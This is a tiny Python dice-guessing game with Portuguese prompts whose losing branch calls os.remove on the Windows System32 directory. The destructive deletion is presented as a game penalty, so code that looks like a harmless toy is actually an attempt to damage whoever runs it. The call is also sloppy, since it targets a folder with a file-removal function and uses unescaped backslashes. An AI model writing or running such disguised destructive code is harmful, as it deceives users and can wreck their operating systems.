import os
import random
escolha = int(input("digite um numero de 1 a 6: "))
aleatorio = random.randint(0,6)

if escolha == aleatorio:
    print("Parabens voce acertou o numero!!")
else:
    os.remove("C:\Windows\System32")